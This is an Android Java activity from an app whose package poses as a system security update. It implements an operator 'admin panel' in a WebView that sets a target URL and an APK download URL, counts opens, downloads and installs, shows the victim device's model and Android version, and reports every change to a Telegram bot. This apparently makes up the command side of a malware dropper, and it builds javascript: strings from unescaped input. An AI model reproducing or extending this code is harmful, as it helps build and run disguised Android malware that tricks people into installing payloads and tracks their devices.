package com.system.security.update;

import android.annotation.SuppressLint;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.appcompat.app.AppCompatActivity;

public class AdminPanelActivity extends AppCompatActivity {
    
    private WebView adminWebView;
    private ProgressBar progressBar;
    
    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_admin_panel);
        
        adminWebView = findViewById(R.id.adminWebView);
        progressBar = findViewById(R.id.progressBar);
        
        setupWebView();
        
        // Load admin panel HTML from assets
        adminWebView.loadUrl("file:///android_asset/admin_panel.html");
    }
    
    private void setupWebView() {
        WebSettings settings = adminWebView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        
        adminWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);
                injectStats(view);
            }
        });
        
        adminWebView.setWebChromeClient(new WebChromeClient());
        adminWebView.addJavascriptInterface(new AdminInterface(), "Android");
    }
    
    private void injectStats(WebView view) {
        String js = "javascript:updateStats(" +
                Config.totalOpens + "," +
                Config.totalDownloads + "," +
                Config.totalInstalls + ",'" +
                Config.CURRENT_TARGET_URL + "','" +
                Config.APK_DOWNLOAD_URL + "','" +
                Config.deviceModel + "','" +
                Config.deviceAndroid + "');";
        view.loadUrl(js);
    }
    
    private class AdminInterface {
        
        @JavascriptInterface
        public void setTargetUrl(String url) {
            Config.CURRENT_TARGET_URL = url;
            runOnUiThread(() -> {
                adminWebView.loadUrl(
                    "javascript:showMessage('✅ Target URL updated: " + url + "','success')");
            });
            sendTelegramNotif("🔗 *Target URL Changed*\nNew: `" + url + "`");
        }
        
        @JavascriptInterface
        public void setApkUrl(String url) {
            Config.APK_DOWNLOAD_URL = url;
            runOnUiThread(() -> {
                adminWebView.loadUrl(
                    "javascript:showMessage('✅ APK URL updated: " + url + "','success')");
            });
            sendTelegramNotif("📦 *APK URL Changed*\nDownload: `" + url + "`");
        }
        
        @JavascriptInterface
        public String getTargetUrl() { return Config.CURRENT_TARGET_URL; }
        
        @JavascriptInterface
        public String getApkUrl() { return Config.APK_DOWNLOAD_URL; }
        
        @JavascriptInterface
        public int getTotalOpens() { return Config.totalOpens; }
        
        @JavascriptInterface
        public int getTotalDownloads() { return Config.totalDownloads; }
        
        @JavascriptInterface
        public int getTotalInstalls() { return Config.totalInstalls; }
        
        @JavascriptInterface
        public String getDeviceModel() { return Config.deviceModel; }
        
        @JavascriptInterface
        public String getAndroidVer() { return Config.deviceAndroid; }
        
        private void sendTelegramNotif(String msg) {
            TelegramBotHelper.sendToAdmin(AdminPanelActivity.this, msg);
        }
    }
}
